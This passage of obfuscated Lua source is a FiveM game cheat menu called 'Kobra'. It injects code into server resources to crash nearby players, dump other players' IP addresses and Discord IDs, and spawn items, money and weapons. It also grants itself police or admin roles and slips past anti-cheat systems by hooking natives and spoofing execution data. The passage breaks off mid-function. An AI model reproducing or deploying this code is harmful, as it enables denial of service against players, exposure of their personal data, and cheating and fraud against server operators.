                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v591=2 + 0 ;end end end});end if (GetResourceState("ox_lib")=="started") then v97({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v595=0 + 0 ;while true do if (v595==(0 + 0)) then if (GetResourceState("WaveShield")=="started") then local v984=0 + 0 ;while true do if ((0 -0)==v984) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",3000);return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="BRING NEARBY PLAYERS",onSelect=function() local v596=0;while true do if (v596==(0 + 0)) then v12:Notify("success","Kobra","Attempting to bring all players",3096 -(23 + 73) );MachoInjectThread(0,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);break;end end end});end if (GetResourceState("mc9-adminmenu")=="started") then v97({type="button",label="ADMIN MENU (F8)",onSelect=function() local v597=0;while true do if (v597==(285 -(26 + 259))) then v12:Notify("success","Kobra","Admin Menu List",1306 + 1694 );MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v97({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v598=0;while true do if (v598==(0 -0)) then v12:Notify("success","Kobra","Spawning Items",3000);MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v97({type="button",label="HIT DMS",onSelect=function() v12:Notify("success","Kobra","Message Sent",10525 -7525 );MachoInjectResource2(1630 -(1094 + 535) ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with Kobra Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
                ]]);end});end if (GetResourceState("amigo")=="started") then v97({type="button",label="ADD ITEM (1)",onSelect=function() v12:HideUI();local function v599(v700,v701) local v702=0 + 0 ;local v703;local v704;while true do if (v702==(1876 -(1554 + 322))) then v703=nil;v704=false;v702=1426 -(989 + 436) ;end if (v702==(1180 -(816 + 362))) then return v703;end if (v702==(1 -0)) then v60(v700,v701 or "" ,function(v985) local v986=0 -0 ;while true do if (v986==(0 -0)) then v703=v985;v704=true;break;end end end,"typeable");while  not v704 do Wait(0 -0 );end v702=4 -2 ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v600=v599("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v600));if ( not v600 or (v600=="")) then local v822=0;while true do if (v822==(4 -3)) then v12:ShowUI();return;end if (v822==0) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",39 + 2961 );v822=764 -(86 + 677) ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v601=v599("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v601));local v602=tonumber(v601);if ( not v602 or (v602<(1 + 0))) then local v823=0 + 0 ;while true do if (v823==(1026 -(263 + 763))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v602=1;break;end end end if (v602>(47402 + 52598)) then local v824=0;while true do if (v824==(858 -(649 + 209))) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v602=100000;break;end end end v600=tostring(v600 or "" );v602=tonumber(v602 or (4 -3) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v600);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v602);local v603,v604=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v600,v602,v600,v602));end);if  not v603 then local v825=0;while true do if (v825==(732 -(643 + 88))) then v12:Notify("error","Kobra","String format failed — check console",5769 -(54 + 1715) );break;end if (v825==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v604);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v600),"itemCount =",tostring(v602));v825=2 -1 ;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();end});end local v298=GetResourceState("scripts")=="started" ;local v299=GetResourceState("framework")=="started" ;if (v298 or v299) then local v547=0 -0 ;local v548;while true do if (v547==0) then v548=(v298 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() local v881=0 + 0 ;while true do if (v881==0) then v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",295 + 2705 );MachoInjectResourceRaw(v548,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);break;end end end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v826=0 -0 ;while true do if (v826==(1383 -(132 + 1251))) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then local v937=0 + 0 ;while true do if (v937==(0 -0)) then v12:Notify("Setjob","Kobra","Your job has been set to police",2324 + 676 );MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() local v605=458 -(185 + 273) ;while true do if (v605==0) then v12:Notify("Setjob","Kobra","You are now Police",728 + 2272 );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);break;end end end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v606) if v606 then local v827=0;while true do if (v827==(0 -0)) then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",1502 + 2498 );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else local v828=1224 -(361 + 863) ;while true do if ((0 -0)==v828) then v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",5327 -(443 + 884) );v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);break;end end end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v607) if v607 then local v829=0;while true do if (v829==(0 -0)) then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);break;end end else local v830=0 + 0 ;while true do if (v830==(0 -0)) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v608=0 + 0 ;local v609;local v610;local v611;local v612;while true do if ((2 + 0)==v608) then Wait(1000);v611=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v612=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v609,v610);v608=6 -3 ;end if (v608==(750 -(16 + 731))) then v48(v611,v612);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",4000);break;end if ((0 + 0)==v608) then v609="";v610=1;v12:HideUI();v608=1 + 0 ;end if (1==v608) then v60("Gang Name","",function(v938) if (v938 and (v938~="")) then v609=v938;end end,"typeable");Wait(1766 + 534 );v60("Gang Rank","",function(v939) if (v939 and (v939~="")) then v610=tonumber(v939) or (761 -(527 + 233)) ;end end,"typeable");v608=2 + 0 ;end end end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() local v613=0;local v614;local v615;local v616;local v617;local v618;local v619;while true do if (v613==(11 -6)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v615);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v617);v618,v619=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v615,v617));end);v613=6 + 0 ;end if (3==v613) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v616));v617=tonumber(v616);if ( not v617 or (v617<(1786 -(1107 + 678)))) then local v987=0;while true do if (v987==(0 + 0)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v617=1 + 0 ;break;end end end v613=4;end if ((52 -(4 + 46))==v613) then if ( not v615 or (v615=="")) then local v988=0 -0 ;while true do if (v988==(0 -0)) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3000);v988=1 + 0 ;end if ((1 -0)==v988) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v616=v614("Item Count","1");v613=4 -1 ;end if (v613==(1402 -(1262 + 134))) then if  not v618 then local v989=0 -0 ;while true do if (v989==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v619);v12:Notify("error","Kobra","String format failed — check console",4000);break;end end else local v990=0 + 0 ;while true do if ((0 + 0)==v990) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",4795 -(383 + 412) );break;end end end v12:ShowUI();break;end if (v613==(1 + 0)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v615=v614("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v615));v613=2;end if (v613==(0 + 0)) then v12:HideUI();v614=nil;function v614(v940,v941) local v942=0 + 0 ;local v943;local v944;while true do if (v942==(0 + 0)) then v943=nil;v944=false;v942=1 + 0 ;end if (v942==(2 -0)) then return v943;end if (v942==1) then v60(v940,v941 or "" ,function(v1213) local v1214=0 + 0 ;while true do if ((0 -0)==v1214) then v943=v1213;v944=true;break;end end end,"typeable");while  not v944 do Wait(0 -0 );end v942=2;end end end v613=2 -1 ;end if (v613==(2 + 2)) then if (v617>(100707 -(667 + 40))) then local v991=0;while true do if (v991==(1310 -(436 + 874))) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v617=101606 -(762 + 844) ;break;end end end v615=tostring(v615 or "" );v617=tonumber(v617 or (1 -0) );v613=11 -6 ;end end end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() local v620=0;local v621;local v622;local v623;local v624;while true do if (v620==(1 + 1)) then v623=v621("Tag Color (R, G, B)","0, 255, 0");if ( not v623 or (v623=="")) then v623="255, 255, 255";end Wait(51 + 449 );v620=479 -(209 + 267) ;end if (v620==(0 -0)) then v12:HideUI();v621=nil;function v621(v945,v946) local v947=0 -0 ;local v948;local v949;while true do if (v947==(1712 -(1611 + 100))) then v60(v945,v946 or "" ,function(v1215) v948=v1215;v949=true;end,"typeable");while  not v949 do Wait(0);end v947=2 + 0 ;end if (v947==(786 -(14 + 770))) then return v948;end if (0==v947) then v948=nil;v949=false;v947=1785 -(1165 + 619) ;end end end v620=1 -0 ;end if (v620==(382 -(229 + 152))) then v622=v621("Chat Tag Name","");if ( not v622 or (v622=="")) then local v992=0;while true do if (v992==0) then v12:ShowUI();return;end end end Wait(500);v620=2;end if (v620==(197 -(107 + 87))) then v624=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v624,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v622,v623));v12:ShowUI();break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v625=0 -0 ;while true do if (v625==(0 + 0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() local v626=0 + 0 ;while true do if (v626==(0 -0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v486) for v549,v550 in pairs(v44) do if (v550:lower()==v486:lower()) then v23=v550;Wait(250);v12:ShowUI();return;end end end,"keybind");local v300=0;local v301=120;while true do Wait(0);if v32 then local v627=v38[v39];if IsControlJustReleased(0 -0 ,14) then local v831=0;while true do if ((0 + 0)==v831) then v39=(v39% #v38) + (15 -(13 + 1)) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));break;end end end if IsControlJustReleased(0 + 0 ,15) then local v832=0 + 0 ;while true do if (v832==0) then v39=((v39-(1060 -(987 + 71)))% #v38) + (2 -1) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));break;end end end if (v627=="Shoot Weapon") then local v833=0 -0 ;while true do if (v833==(699 -(514 + 185))) then if IsDisabledControlJustPressed(0,6 + 38 ) then local v1147=0 -0 ;while true do if (v1147==(0 -0)) then v34=((v34-(1506 -(771 + 733)))% #v36) + (1 -0) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end if IsDisabledControlJustPressed(0 -0 ,38) then local v1148=1167 -(407 + 760) ;while true do if (v1148==0) then v34=(v34% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end break;end end elseif (v627=="Spawn Car") then local v950=0;while true do if (v950==(0 + 0)) then if IsDisabledControlJustPressed(0,2 + 42 ) then local v1300=0;while true do if (v1300==(0 + 0)) then v35=((v35-(1856 -(169 + 1685)))% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end if IsDisabledControlJustPressed(0 + 0 ,38) then local v1301=0;while true do if (v1301==0) then v35=(v35% #v37) + (392 -(41 + 350)) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end break;end end end if IsDisabledControlPressed(0 -0 ,24) then local v834=v627;if (v834=="Shoot Weapon") then local v951=0 -0 ;local v952;while true do if (v951==(4 -3)) then if (v952~=v33) then local v1302=0 -0 ;while true do if (v1302==(0 + 0)) then v33=v952;print(("weapon: %s, LastWeaponFired: %s"):format(v952,v33));v1302=1;end if (v1302==(888 -(790 + 97))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1652=0 -0 ;local v1653;local v1654;local v1655;local v1656;local v1657;local v1658;local v1659;local v1660;local v1661;local v1662;while true do if (v1652==5) then function v1661(v1740) local v1741=0 + 0 ;local v1742;while true do if (v1741==(0 + 0)) then v1742={};for v1783=246 -(235 + 10) , #v1740 do v1742[v1783]=string.byte(v1740,v1783);end v1741=1;end if (v1741==(1 + 0)) then return table.concat(v1742,",");end end end v1662=v1661(v952);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

